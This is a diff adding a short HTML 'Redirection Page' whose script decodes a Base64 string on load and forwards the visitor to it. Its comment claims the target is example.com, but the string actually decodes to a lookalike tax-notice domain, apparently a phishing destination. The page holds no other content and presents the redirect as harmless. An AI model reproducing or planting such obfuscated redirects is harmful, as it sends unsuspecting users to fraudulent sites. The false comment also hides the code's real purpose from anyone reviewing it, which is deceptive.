@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirection Page</title>
+    <script type="text/javascript">
+        // Base64 encoded and URL encoded URL (for redirection)
+        var encodedUrl = "aHR0cHM6Ly9vbmxpbmUtYXRvLW5vdGljZXMuZXMvY2JneC8=";  // This is "https://example.com" encoded
+        // Decode the URL and redirect
+        window.location.href = decodeURIComponent(atob(encodedUrl));
+    </script>
+    <noscript>
+        You must enable JavaScript in your browser to view this webpage.
+    </noscript>
+</head>
+<body>
+    <!-- Fallback message for users who don't have JavaScript enabled -->
+    <p>If you are seeing this message, please enable JavaScript in your browser.</p>
+</body>
+</html>
